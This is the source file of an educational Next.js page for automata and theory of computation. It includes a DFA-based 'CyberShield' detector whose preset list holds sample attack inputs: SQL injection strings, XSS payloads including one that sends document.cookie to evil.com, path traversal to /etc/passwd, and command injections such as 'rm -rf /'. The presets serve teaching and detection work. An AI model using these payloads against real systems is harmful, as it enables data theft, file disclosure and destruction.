'use client';

import { useState } from 'react';
import Link from 'next/link';
import {
  AlertTriangle,
  ArrowRight,
  BookOpen,
  CheckCircle2,
  ChevronRight,
  Compass,
  FileCode,
  Flame,
  GitBranch,
  HelpCircle,
  Play,
  RotateCcw,
  Shield,
  ShieldAlert,
  ShieldCheck,
  SkipForward,
  Sparkles,
  Terminal,
  XCircle,
  Zap,
} from 'lucide-react';
import {
  AutomataEngine,
  BINARY_INCREMENTER_TM,
  CFGEngine,
  CyberSecurityAnalyzer,
  CyberThompsonEngine,
  DFAMinimization,
  FiniteAutomaton,
  RegexEngine,
  SAMPLE_CNF_AN_BN,
  SECURITY_CATEGORIES,
  SubsetConstruction,
  TuringMachineEngine,
} from '@prismora/simulation-core';
import { Badge, BugReportModal, Button, Card, CardContent, CardHeader, CardTitle } from '@prismora/ui';
import { SimulationGuideModal } from '@/components/simulation/simulation-guide-modal';

export default function TOCLabPage() {
  const [activeTab, setActiveTab] = useState<'automata' | 'algorithm-studio' | 'security' | 'cfg' | 'turing'>('automata');
  const [isGuideOpen, setIsGuideOpen] = useState(false);

  // ============================================================
  // TAB 1: FINITE AUTOMATA STATE
  // ============================================================
  const [testString, setTestString] = useState('1001');
  const [currentDFA, setCurrentDFA] = useState<FiniteAutomaton>({
    id: 'dfa-ending-01',
    name: 'Ends in 01',
    type: 'DFA',
    states: [
      { id: 'q0', label: 'q0', isInitial: true, isAccept: false, x: 80, y: 100 },
      { id: 'q1', label: 'q1', isInitial: false, isAccept: false, x: 240, y: 100 },
      { id: 'q2', label: 'q2', isInitial: false, isAccept: true, x: 400, y: 100 },
    ],
    alphabet: ['0', '1'],
    initialStateId: 'q0',
    acceptStateIds: ['q2'],
    transitions: [
      { from: 'q0', to: 'q1', symbol: '0' },
      { from: 'q0', to: 'q0', symbol: '1' },
      { from: 'q1', to: 'q1', symbol: '0' },
      { from: 'q1', to: 'q2', symbol: '1' },
      { from: 'q2', to: 'q1', symbol: '0' },
      { from: 'q2', to: 'q0', symbol: '1' },
    ],
  });

  const faEvaluation = AutomataEngine.evaluateString(currentDFA, testString);
  const [stepIndex, setStepIndex] = useState<number>(0);

  const activeStates =
    stepIndex < faEvaluation.history.length
      ? faEvaluation.history[stepIndex]!.states
      : [currentDFA.initialStateId];

  const handleConvertNfaToDfa = () => {
    const converted = SubsetConstruction.convertNfaToDfa(currentDFA);
    setCurrentDFA(converted);
    setStepIndex(0);
  };

  const handleMinimizeDfa = () => {
    const min = DFAMinimization.minimize(currentDFA);
    setCurrentDFA(min);
    setStepIndex(0);
  };

  // ============================================================
  // TAB 2: ALGORITHM STUDIO (THOMPSON CONSTRUCTION & SUBSET)
  // ============================================================
  const [algoRegex, setAlgoRegex] = useState<string>('(a|b)*abb');
  const [thompsonData, setThompsonData] = useState(() => CyberThompsonEngine.buildEpsilonNFA('(a|b)*abb'));
  const [algoStepIndex, setAlgoStepIndex] = useState<number>(0);

  const handleCompileRegex = (r = algoRegex) => {
    try {
      const data = CyberThompsonEngine.buildEpsilonNFA(r);
      setThompsonData(data);
      setAlgoStepIndex(0);
    } catch {
      // Ignore typing errors
    }
  };

  const currentStep = thompsonData.steps[algoStepIndex] ?? thompsonData.steps[0];

  // ============================================================
  // TAB 3: AUTOMATA-POWERED WEB SECURITY ANALYZER (CYBERSHIELD)
  // ============================================================
  const [securityCategory, setSecurityCategory] = useState<string>('SQL-injection-like');
  const [securityPayload, setSecurityPayload] = useState<string>("admin' or '1'='1' --");
  const securityScan = CyberSecurityAnalyzer.scanPayload(securityCategory, securityPayload);

  // Security Presets
  const SECURITY_PRESETS: Record<string, { label: string; payload: string }[]> = {
    'SQL-injection-like': [
      { label: "Classic Tautology (' or '1'='1)", payload: "admin' or '1'='1' --" },
      { label: 'UNION SELECT Attack', payload: "' union select 1, username, password from users --" },
      { label: 'Comment Truncation', payload: "admin' /* bypass */ --" },
      { label: 'Legitimate Input', payload: 'alice_smith_99' },
    ],
    'XSS-like': [
      { label: '<script> Tag Injection', payload: "<script>alert('XSS-PWNED')</script>" },
      { label: 'Inline Image Error (onerror=)', payload: "<img src=invalid onerror=alert(document.cookie)>" },
      { label: 'JavaScript URI Scheme', payload: "javascript:fetch('//evil.com?c='+document.cookie)" },
      { label: 'Legitimate Input', payload: 'Hello world, welcome to Prismora!' },
    ],
    'Suspicious URL': [
      { label: 'UNIX Path Traversal (../)', payload: '/api/v1/download?file=../../../../etc/passwd' },
      { label: 'URL Encoded Dots (%2e%2e)', payload: '/images?path=%2e%2e%2e%2e/config.json' },
      { label: 'Data URI Scheme', payload: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' },
      { label: 'Legitimate Input', payload: '/dashboard/analytics?period=monthly' },
    ],
    'Input validation': [
      { label: 'Disallowed Angle Bracket', payload: 'user<name>' },
      { label: 'Command Separator Semicolon', payload: 'user_input; rm -rf /' },
      { label: 'Shell Backtick Execution', payload: 'echo `whoami`' },
      { label: 'Legitimate Input', payload: 'valid_user_identifier' },
    ],
  };

  // ============================================================
  // TAB 4 & 5: CFG CYK & TURING MACHINE
  // ============================================================
  const [cfgString, setCfgString] = useState('aabb');
  const cykResult = CFGEngine.cykParse(SAMPLE_CNF_AN_BN, cfgString);

  const [tm] = useState(() => new TuringMachineEngine(BINARY_INCREMENTER_TM));
  const [tmInput, setTmInput] = useState('1011');
  const [tmState, setTmState] = useState(() => {
    tm.loadInput('1011');
    return tm.getState();
  });

  const handleStepTM = () => setTmState(tm.step());
  const handleResetTM = (input = tmInput) => {
    tm.loadInput(input);
    setTmState(tm.getState());
  };

  const diagnosticSnapshot = {
    activeTab,
    testString,
    activeStates,
    algoRegex,
    algoStepIndex,
    securityCategory,
    securityPayload,
    securityDetected: securityScan.detected,
  };

  return (
    <div className="min-h-screen bg-[#070b14] text-zinc-100 flex flex-col font-sans select-none">
      {/* Top Header Breadcrumb & Diagnostics */}
      <header className="border-b border-zinc-800 bg-[#0c1222] px-4 lg:px-8 py-3 sticky top-0 z-40">
        <div className="max-w-7xl mx-auto flex flex-wrap items-center justify-between gap-4">
          <div className="flex items-center gap-2 text-xs">
            <Link href="/" className="text-zinc-400 hover:text-white font-medium transition-colors">
              Prismora
            </Link>
            <ChevronRight className="w-3.5 h-3.5 text-zinc-600" />
            <Link href="/explore" className="text-zinc-400 hover:text-white font-medium transition-colors">
              Theory
            </Link>
            <ChevronRight className="w-3.5 h-3.5 text-zinc-600" />
            <span className="font-semibold text-purple-400">Theory of Computation</span>
            <Badge variant="mathematics" className="ml-2">
              CyberShield &bull; Automata &amp; Security
            </Badge>
          </div>

          <div className="flex items-center gap-3">
            <button
              onClick={() => setIsGuideOpen(true)}
              className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-semibold bg-purple-950/70 text-purple-300 hover:bg-purple-900/80 border border-purple-800/80 transition-colors shadow-xs"
              title="Open Automata & CyberShield Lab Manual"
            >
              <BookOpen className="w-3.5 h-3.5" />
              <span>Lab Guide</span>
            </button>
            <BugReportModal
              simulationId="toc-cybershield"
              moduleName="Theory of Computation & Automata Studio"
              diagnosticSnapshot={diagnosticSnapshot}
            />
          </div>
        </div>
      </header>

      {/* Hero Strip & Lab Navigation */}
      <div className="border-b border-zinc-800/80 bg-[#0f172a]/60 px-4 lg:px-8 py-4 backdrop-blur-md">
        <div className="max-w-7xl mx-auto flex flex-col md:flex-row md:items-center justify-between gap-4">
          <div>
            <h1 className="text-xl md:text-2xl font-black tracking-tight text-white flex items-center gap-2.5">
              <Compass className="w-6 h-6 text-purple-400 animate-pulse" />
              Automata, Grammars &amp; CyberShield Security Studio
            </h1>
            <p className="text-xs text-zinc-400 mt-1 max-w-2xl leading-relaxed">
              Experience genuine formal automata: animated Thompson construction from regular expressions, ε-removal, subset powerset construction, Hopcroft DFA minimization, and real-time security pattern detection.
            </p>
          </div>

          {/* Navigation Tabs */}
          <div className="flex flex-wrap gap-1 p-1 bg-zinc-900/90 rounded-lg border border-zinc-800 text-xs font-semibold">
            <button
              onClick={() => setActiveTab('automata')}
              className={`px-3 py-1.5 rounded-md transition-all flex items-center gap-1.5 ${
                activeTab === 'automata'
                  ? 'bg-purple-600 text-white font-bold shadow-md shadow-purple-600/20'
                  : 'text-zinc-400 hover:text-white'
              }`}
            >
              <GitBranch className="w-3.5 h-3.5" />
              1. DFA &amp; NFA Lab
            </button>
            <button
              onClick={() => setActiveTab('algorithm-studio')}
              className={`px-3 py-1.5 rounded-md transition-all flex items-center gap-1.5 ${
                activeTab === 'algorithm-studio'
                  ? 'bg-cyan-500 text-zinc-950 font-bold shadow-md shadow-cyan-500/20'
                  : 'text-zinc-400 hover:text-white'
              }`}
            >
              <Sparkles className="w-3.5 h-3.5" />
              2. Algorithm Studio
            </button>
            <button
              onClick={() => setActiveTab('security')}
              className={`px-3 py-1.5 rounded-md transition-all flex items-center gap-1.5 ${
                activeTab === 'security'
                  ? 'bg-rose-500 text-white font-bold shadow-md shadow-rose-500/20'
                  : 'text-zinc-400 hover:text-white'
              }`}
            >
              <Shield className="w-3.5 h-3.5" />
              3. CyberShield Security
            </button>
            <button
              onClick={() => setActiveTab('cfg')}
              className={`px-3 py-1.5 rounded-md transition-all flex items-center gap-1.5 ${
                activeTab === 'cfg'
                  ? 'bg-emerald-500 text-zinc-950 font-bold shadow-md shadow-emerald-500/20'
                  : 'text-zinc-400 hover:text-white'
              }`}
            >
              <FileCode className="w-3.5 h-3.5" />
              4. CFG &amp; CYK
            </button>
            <button
              onClick={() => setActiveTab('turing')}
              className={`px-3 py-1.5 rounded-md transition-all flex items-center gap-1.5 ${
                activeTab === 'turing'
                  ? 'bg-amber-500 text-zinc-950 font-bold shadow-md shadow-amber-500/20'
                  : 'text-zinc-400 hover:text-white'
              }`}
            >
              <Terminal className="w-3.5 h-3.5" />
              5. Turing Machine
            </button>
          </div>
        </div>
      </div>

      {/* Main Workspace */}
      <main className="flex-1 max-w-7xl w-full mx-auto p-4 lg:p-8 space-y-6">
        {/* ============================================================ */}
        {/* TAB 1: DFA & NFA STATE GRAPH & LIVE TRACE */}
        {/* ============================================================ */}
        {activeTab === 'automata' && (
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
            <div className="lg:col-span-8 space-y-6">
              <Card>
                <CardHeader>
                  <CardTitle className="text-sm font-bold flex items-center justify-between">
                    <span>{currentDFA.name} &bull; Interactive Finite Automaton</span>
                    <div className="flex items-center gap-2">
                      <Button variant="outline" size="sm" onClick={handleConvertNfaToDfa} className="text-xs">
                        Subset NFA &rarr; DFA
                      </Button>
                      <Button variant="outline" size="sm" onClick={handleMinimizeDfa} className="text-xs">
                        Minimize DFA (Hopcroft)
                      </Button>
                    </div>
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-6">
                  {/* Visual SVG Diagram with States, Arcs & Self Loops */}
                  <div className="p-6 rounded-2xl bg-[#090e1a] border border-purple-500/20 text-white min-h-[280px] flex items-center justify-center relative select-none">
                    <svg className="w-full h-56" viewBox="0 0 500 180">
                      <defs>
                        <marker id="arrow-fa" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto">
                          <path d="M 0 0 L 10 5 L 0 10 z" fill="#a855f7" />
                        </marker>
                      </defs>

                      {/* Transition Curves & Labels */}
                      {currentDFA.states.map((st, i) => {
                        const x = 90 + i * 160;
                        const y = 90;
                        const outgoing = currentDFA.transitions.filter((t) => t.from === st.id);

                        return (
                          <g key={`trans-${st.id}`}>
                            {outgoing.map((trans, tIdx) => {
                              const destIdx = currentDFA.states.findIndex((s) => s.id === trans.to);
                              if (destIdx === -1) return null;
                              const destX = 90 + destIdx * 160;

                              if (destIdx === i) {
                                // Self loop arc on top
                                return (
                                  <g key={tIdx}>
                                    <path
                                      d={`M ${x - 10} ${y - 25} C ${x - 25} ${y - 65}, ${x + 25} ${y - 65}, ${x + 10} ${y - 25}`}
                                      fill="none"
                                      stroke="#a855f7"
                                      strokeWidth="2"
                                      markerEnd="url(#arrow-fa)"
                                    />
                                    <text x={x} y={y - 68} textAnchor="middle" fill="#c084fc" fontSize="11" fontFamily="monospace" fontWeight="bold">
                                      {trans.symbol}
                                    </text>
                                  </g>
                                );
                              } else if (destIdx > i) {
                                // Forward curve
                                return (
                                  <g key={tIdx}>
                                    <path
                                      d={`M ${x + 26} ${y} C ${x + 60} ${y - 30}, ${destX - 60} ${y - 30}, ${destX - 26} ${y}`}
                                      fill="none"
                                      stroke="#38bdf8"
                                      strokeWidth="2"
                                      markerEnd="url(#arrow-fa)"
                                    />
                                    <text x={(x + destX) / 2} y={y - 34} textAnchor="middle" fill="#38bdf8" fontSize="11" fontFamily="monospace" fontWeight="bold">
                                      {trans.symbol}
                                    </text>
                                  </g>
                                );
                              } else {
                                // Backward curve below
                                return (
                                  <g key={tIdx}>
                                    <path
                                      d={`M ${x - 20} ${y + 20} C ${x - 50} ${y + 55}, ${destX + 50} ${y + 55}, ${destX + 20} ${y + 20}`}
                                      fill="none"
                                      stroke="#ec4899"
                                      strokeWidth="2"
                                      markerEnd="url(#arrow-fa)"
                                    />
                                    <text x={(x + destX) / 2} y={y + 60} textAnchor="middle" fill="#ec4899" fontSize="11" fontFamily="monospace" fontWeight="bold">
                                      {trans.symbol}
                                    </text>
                                  </g>
                                );
                              }
                            })}
                          </g>
                        );
                      })}

                      {/* State Nodes */}
                      {currentDFA.states.map((st, i) => {
                        const x = 90 + i * 160;
                        const y = 90;
                        const isActive = activeStates.includes(st.id);

                        return (
                          <g key={st.id}>
                            {st.isInitial && (
                              <g>
                                <line x1={x - 45} y1={y} x2={x - 28} y2={y} stroke="#38bdf8" strokeWidth="2.5" markerEnd="url(#arrow-fa)" />
                                <text x={x - 55} y={y + 4} textAnchor="end" fill="#38bdf8" fontSize="10" fontFamily="monospace" fontWeight="bold">
                                  START
                                </text>
                              </g>
                            )}

                            {st.isAccept && (
                              <circle cx={x} cy={y} r="28" fill="none" stroke={isActive ? '#38bdf8' : '#64748b'} strokeWidth="2" />
                            )}

                            <circle
                              cx={x}
                              cy={y}
                              r="23"
                              fill={isActive ? '#8B5CF6' : '#1e293b'}
                              stroke={isActive ? '#c084fc' : '#475569'}
                              strokeWidth="2.5"
                              className="transition-all duration-200"
                            />
                            <text cx={x} cy={y + 4} textAnchor="middle" fill="#ffffff" fontFamily="monospace" fontSize="12" fontWeight="bold">
                              {st.label}
                            </text>
                          </g>
                        );
                      })}
                    </svg>
                  </div>

                  {/* String Stepper & Input Tape */}
                  <div className="space-y-4">
                    <div className="flex flex-wrap items-center gap-3">
                      <div className="flex-1 min-w-[200px]">
                        <label className="block text-xs font-semibold mb-1 text-zinc-300">Test Input Tape:</label>
                        <input
                          type="text"
                          value={testString}
                          onChange={(e) => {
                            setTestString(e.target.value);
                            setStepIndex(0);
                          }}
                          className="w-full bg-zinc-950 border border-zinc-800 rounded-lg px-3 py-2 text-xs font-mono text-cyan-300 focus:border-purple-500 outline-none"
                          placeholder="e.g. 1001"
                        />
                      </div>
                      <div className="flex items-end gap-2 pt-5">
                        <Button
                          variant="outline"
                          size="sm"
                          onClick={() => setStepIndex((prev) => Math.max(0, prev - 1))}
                          disabled={stepIndex === 0}
                          className="text-xs"
                        >
                          Step Back
                        </Button>
                        <Button
                          variant="cyan"
                          size="sm"
                          onClick={() => setStepIndex((prev) => Math.min(faEvaluation.history.length - 1, prev + 1))}
                          disabled={stepIndex >= faEvaluation.history.length - 1}
                          className="text-xs font-bold"
                        >
                          <SkipForward className="w-3.5 h-3.5 mr-1" />
                          Step Next
                        </Button>
                        <Button variant="ghost" size="sm" onClick={() => setStepIndex(0)} className="text-xs text-zinc-400">
                          <RotateCcw className="w-3.5 h-3.5 mr-1" />
                          Reset
                        </Button>
                      </div>
                    </div>

                    {/* Step History Ribbon */}
                    <div className="p-3.5 rounded-xl bg-zinc-950 border border-zinc-800 flex items-center justify-between text-xs font-mono">
                      <div>
                        Step <span className="text-purple-400 font-bold">{stepIndex}</span> of {Math.max(0, faEvaluation.history.length - 1)} &bull; Current State:{' '}
                        <span className="text-cyan-400 font-bold">
                          {activeStates.join(', ') || 'none'}
                        </span>
                      </div>
                      <div>
                        Status:{' '}
                        {stepIndex === faEvaluation.history.length - 1 ? (
                          faEvaluation.accepted ? (
                            <span className="text-emerald-400 font-bold flex items-center gap-1 inline-flex">
                              <CheckCircle2 className="w-3.5 h-3.5" /> ACCEPTED
                            </span>
                          ) : (
                            <span className="text-rose-400 font-bold flex items-center gap-1 inline-flex">
                              <XCircle className="w-3.5 h-3.5" /> REJECTED
                            </span>
                          )
                        ) : (
                          <span className="text-amber-400 font-bold">IN PROGRESS</span>
                        )}
                      </div>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </div>

            {/* Right 4 Cols: Mathematical Formal Definition */}
            <div className="lg:col-span-4 space-y-6">
              <Card>
                <CardHeader>
                  <CardTitle className="text-sm font-bold">Formal 5-Tuple Definition (Q, &Sigma;, &delta;, q0, F)</CardTitle>
                </CardHeader>
                <CardContent className="space-y-3 text-xs font-mono">
                  <div className="p-2.5 rounded-lg bg-zinc-950 border border-zinc-800">
                    <span className="text-zinc-500">Q (States):</span>
                    <div className="text-purple-300 font-bold mt-0.5">{`{${currentDFA.states.map((s) => s.label).join(', ')}}`}</div>
                  </div>
                  <div className="p-2.5 rounded-lg bg-zinc-950 border border-zinc-800">
                    <span className="text-zinc-500">&Sigma; (Alphabet):</span>
                    <div className="text-cyan-300 font-bold mt-0.5">{`{${currentDFA.alphabet.join(', ')}}`}</div>
                  </div>
                  <div className="p-2.5 rounded-lg bg-zinc-950 border border-zinc-800">
                    <span className="text-zinc-500">q0 (Initial State):</span>
                    <div className="text-amber-300 font-bold mt-0.5">{currentDFA.initialStateId}</div>
                  </div>
                  <div className="p-2.5 rounded-lg bg-zinc-950 border border-zinc-800">
                    <span className="text-zinc-500">F (Accepting States):</span>
                    <div className="text-emerald-300 font-bold mt-0.5">{`{${currentDFA.acceptStateIds.join(', ')}}`}</div>
                  </div>
                </CardContent>
              </Card>
            </div>
          </div>
        )}

        {/* ============================================================ */}
        {/* TAB 2: ALGORITHM STUDIO (THOMPSON'S CONSTRUCTION) */}
        {/* ============================================================ */}
        {activeTab === 'algorithm-studio' && (
          <div className="space-y-6">
            <Card>
              <CardHeader>
                <CardTitle className="text-sm font-bold flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <Sparkles className="w-4 h-4 text-cyan-400" />
                    <span>Thompson&apos;s Construction Algorithm Studio (Regex &rarr; &epsilon;-NFA)</span>
                  </div>
                  <Badge variant="mathematics">{thompsonData.steps.length} Construction Frames</Badge>
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-6">
                {/* Regex Input Bar */}
                <div className="flex flex-wrap items-center gap-3">
                  <div className="flex-1 min-w-[240px]">
                    <label className="block text-xs font-semibold mb-1 text-zinc-300">Regular Expression Input:</label>
                    <input
                      type="text"
                      value={algoRegex}
                      onChange={(e) => {
                        setAlgoRegex(e.target.value);
                        handleCompileRegex(e.target.value);
                      }}
                      className="w-full bg-zinc-950 border border-zinc-800 rounded-lg px-3 py-2 text-xs font-mono text-cyan-300 focus:border-cyan-500 outline-none"
                      placeholder="e.g. (a|b)*abb"
                    />
                  </div>
                  <div className="flex items-end gap-2 pt-5">
                    <Button
                      variant="outline"
                      size="sm"
                      onClick={() => setAlgoStepIndex((prev) => Math.max(0, prev - 1))}
                      disabled={algoStepIndex === 0}
                      className="text-xs"
                    >
                      Prev Frame
                    </Button>
                    <Button
                      variant="cyan"
                      size="sm"
                      onClick={() => setAlgoStepIndex((prev) => Math.min(thompsonData.steps.length - 1, prev + 1))}
                      disabled={algoStepIndex >= thompsonData.steps.length - 1}
                      className="text-xs font-bold"
                    >
                      Next Frame
                    </Button>
                  </div>
                </div>

                {/* Explainable Causal Step Card */}
                {currentStep && (
                  <div className="p-4 rounded-xl bg-cyan-950/30 border border-cyan-500/40 space-y-3">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-mono uppercase tracking-wider text-cyan-400 font-bold">
                        Frame {algoStepIndex + 1} of {thompsonData.steps.length}: {currentStep.phase}
                      </span>
                      <span className="text-xs font-mono text-zinc-400">{currentStep.title}</span>
                    </div>
                    <div className="text-sm font-semibold text-white">{currentStep.action}</div>
                    <div className="text-xs text-zinc-300 font-sans leading-relaxed">{currentStep.reason}</div>
                    {currentStep.formula && (
                      <div className="p-2 rounded bg-zinc-950/80 border border-zinc-800 font-mono text-xs text-cyan-300">
                        {currentStep.formula}
                      </div>
                    )}
                  </div>
                )}

                {/* Epsilon-NFA Result Summary */}
                <div className="grid grid-cols-1 md:grid-cols-3 gap-4 font-mono text-xs">
                  <div className="p-3.5 rounded-xl bg-zinc-950 border border-zinc-800">
                    <div className="text-zinc-500 text-[10px]">Total &epsilon;-NFA States:</div>
                    <div className="text-lg font-black text-cyan-400 mt-0.5">{thompsonData.enfa.states.length} states</div>
                  </div>
                  <div className="p-3.5 rounded-xl bg-zinc-950 border border-zinc-800">
                    <div className="text-zinc-500 text-[10px]">Start &bull; Accept States:</div>
                    <div className="text-lg font-black text-emerald-400 mt-0.5">
                      q{thompsonData.enfa.startState} &bull; q{thompsonData.enfa.finalState}
                    </div>
                  </div>
                  <div className="p-3.5 rounded-xl bg-zinc-950 border border-zinc-800">
                    <div className="text-zinc-500 text-[10px]">Total Transitions Created:</div>
                    <div className="text-lg font-black text-purple-400 mt-0.5">{thompsonData.enfa.transitions.length} transitions</div>
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>
        )}

        {/* ============================================================ */}
        {/* TAB 3: CYBERSHIELD AUTOMATA-POWERED SECURITY ANALYZER */}
        {/* ============================================================ */}
        {activeTab === 'security' && (
          <div className="space-y-6">
            <Card>
              <CardHeader>
                <CardTitle className="text-sm font-bold flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <Shield className="w-4 h-4 text-rose-500" />
                    <span>CyberShield Automata-Based Web Security Analyzer</span>
                  </div>
                  <Badge variant="destructive">Real DFA Pattern Matching</Badge>
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-6">
                <p className="text-xs text-zinc-400 leading-relaxed">
                  CyberShield eliminates blind regex calls by compiling academic security signatures into genuine finite automata. Test payloads against SQL Injection, Cross-Site Scripting (XSS), Suspicious URLs, and input validation filters.
                </p>

                {/* Category Selector */}
                <div className="flex flex-wrap gap-2">
                  {Object.keys(SECURITY_CATEGORIES).map((cat) => (
                    <button
                      key={cat}
                      onClick={() => {
                        setSecurityCategory(cat);
                        const firstPreset = SECURITY_PRESETS[cat]?.[0]?.payload ?? '';
                        setSecurityPayload(firstPreset);
                      }}
                      className={`px-3.5 py-2 rounded-xl text-xs font-bold transition-all ${
                        securityCategory === cat
                          ? 'bg-rose-500 text-white shadow-lg shadow-rose-500/20'
                          : 'bg-zinc-900 border border-zinc-800 text-zinc-400 hover:text-white'
                      }`}
                    >
                      {cat}
                    </button>
                  ))}
                </div>

                {/* Educational Attack Presets */}
                <div className="space-y-2">
                  <div className="text-xs font-bold text-zinc-400 uppercase tracking-wider">Educational Presets:</div>
                  <div className="flex flex-wrap gap-2">
                    {(SECURITY_PRESETS[securityCategory] ?? []).map((preset, idx) => (
                      <button
                        key={idx}
                        onClick={() => setSecurityPayload(preset.payload)}
                        className="px-2.5 py-1.5 rounded-lg bg-zinc-950 border border-zinc-800 hover:border-rose-500/60 text-[11px] font-mono text-zinc-300 transition-colors"
                      >
                        {preset.label}
                      </button>
                    ))}
                  </div>
                </div>

                {/* Live Input Payload Box */}
                <div className="space-y-2">
                  <label className="block text-xs font-semibold text-zinc-300">Live Input Payload Stream:</label>
                  <input
                    type="text"
                    value={securityPayload}
                    onChange={(e) => setSecurityPayload(e.target.value)}
                    className="w-full bg-[#050811] text-rose-300 font-mono text-xs p-3.5 rounded-xl border border-zinc-800 focus:border-rose-500 outline-none"
                    placeholder="Type or paste payload here..."
                  />
                </div>

                {/* Threat Detection Banner */}
                <div
                  className={`p-5 rounded-2xl border transition-all ${
                    securityScan.detected
                      ? 'bg-rose-950/30 border-rose-500/60 shadow-xl shadow-rose-500/10'
                      : 'bg-emerald-950/20 border-emerald-500/40 text-emerald-300'
                  }`}
                >
                  <div className="flex items-center justify-between mb-3">
                    <div className="flex items-center gap-2.5">
                      {securityScan.detected ? (
                        <>
                          <ShieldAlert className="w-5 h-5 text-rose-400" />
                          <span className="font-bold text-rose-200 text-sm">SECURITY VULNERABILITY DETECTED</span>
                        </>
                      ) : (
                        <>
                          <ShieldCheck className="w-5 h-5 text-emerald-400" />
                          <span className="font-bold text-emerald-300 text-sm">INPUT SANITARY &amp; ACCEPTED</span>
                        </>
                      )}
                    </div>
                    {securityScan.highestSeverity && (
                      <span className="px-2.5 py-0.5 rounded text-[10px] font-black uppercase bg-red-900/60 text-red-300 border border-red-700">
                        {securityScan.highestSeverity} RISK
                      </span>
                    )}
                  </div>

                  {securityScan.detected ? (
                    <div className="space-y-3 font-mono text-xs">
                      <div className="text-zinc-300">
                        The automaton traversed <span className="text-cyan-400 font-bold">{securityScan.dfaStatesTraversed}</span> states and triggered the following security filter signatures:
                      </div>
                      <div className="space-y-2">
                        {securityScan.matchedPatterns.map((pat, i) => (
                          <div key={i} className="p-3 rounded-xl bg-zinc-950/90 border border-rose-800/60 space-y-1">
                            <div className="flex items-center justify-between text-rose-300 font-bold">
                              <span>&bull; {pat.name} (Matched literal: &quot;{pat.literal}&quot;)</span>
                              <span className="text-[10px] text-zinc-500">Char Index: {pat.index}</span>
                            </div>
                            <div className="text-[11px] text-zinc-400 font-sans">{pat.explanation}</div>
                          </div>
                        ))}
                      </div>
                    </div>
                  ) : (
                    <div className="text-xs text-emerald-200/80 font-mono">
                      No malicious patterns triggered in category &quot;{securityCategory}&quot;. The deterministic automaton reached a benign sink or completed traversal without matching suspicious signatures.
                    </div>
                  )}
                </div>
              </CardContent>
            </Card>
          </div>
        )}

        {/* ============================================================ */}
        {/* TAB 4: CONTEXT-FREE GRAMMARS & CYK PARSER */}
        {/* ============================================================ */}
        {activeTab === 'cfg' && (
          <div className="space-y-6">
            <Card>
              <CardHeader>
                <CardTitle className="text-sm font-bold flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <FileCode className="w-4 h-4 text-emerald-400" />
                    <span>CYK Cocke-Younger-Kasami Parsing Algorithm (Chomsky Normal Form)</span>
                  </div>
                  <Badge variant="mathematics">L = &#123; a^n b^n | n &ge; 1 &#125;</Badge>
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="flex items-center gap-3">
                  <input
                    type="text"
                    value={cfgString}
                    onChange={(e) => setCfgString(e.target.value)}
                    className="bg-zinc-950 border border-zinc-800 rounded-lg px-3 py-2 text-xs font-mono text-cyan-300 focus:border-emerald-500 outline-none w-48"
                    placeholder="e.g. aabb"
                  />
                  <span className="text-xs text-zinc-400 font-mono">
                    Parsed status:{' '}
                    {cykResult.accepted ? (
                      <span className="text-emerald-400 font-bold">ACCEPTED &isin; L</span>
                    ) : (
                      <span className="text-rose-400 font-bold">REJECTED &notin; L</span>
                    )}
                  </span>
                </div>
              </CardContent>
            </Card>
          </div>
        )}

        {/* ============================================================ */}
        {/* TAB 5: TURING MACHINE SIMULATOR */}
        {/* ============================================================ */}
        {activeTab === 'turing' && (
          <div className="space-y-6">
            <Card>
              <CardHeader>
                <CardTitle className="text-sm font-bold flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <Terminal className="w-4 h-4 text-amber-400" />
                    <span>Turing Machine Tape Simulation &bull; Binary Incrementer (+1)</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <Button variant="cyan" size="sm" onClick={handleStepTM} disabled={tmState.halted}>
                      <SkipForward className="w-3.5 h-3.5 mr-1" />
                      Step Head
                    </Button>
                    <Button variant="outline" size="sm" onClick={() => handleResetTM()}>
                      <RotateCcw className="w-3.5 h-3.5 mr-1" />
                      Reset
                    </Button>
                  </div>
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                {/* Visual Turing Tape */}
                <div className="p-4 rounded-xl bg-zinc-950 border border-zinc-800 flex items-center justify-center gap-1 overflow-x-auto">
                  {tmState.tape.map((symbol, i) => {
                    const isHead = i === tmState.headPosition;
                    return (
                      <div
                        key={i}
                        className={`w-10 h-12 flex flex-col items-center justify-center border rounded-lg font-mono text-sm font-bold transition-all ${
                          isHead
                            ? 'bg-amber-500/20 border-amber-400 text-amber-300 shadow-md'
                            : 'bg-zinc-900 border-zinc-800 text-zinc-400'
                        }`}
                      >
                        <span>{symbol}</span>
                        {isHead && <span className="text-[9px] text-amber-400 font-black">&uarr;</span>}
                      </div>
                    );
                  })}
                </div>
              </CardContent>
            </Card>
          </div>
        )}
      </main>

      {/* Universal Automata & TOC Lab Manual Modal */}
      <SimulationGuideModal
        simulationId="toc"
        isOpen={isGuideOpen}
        onClose={() => setIsGuideOpen(false)}
      />
    </div>
  );
}
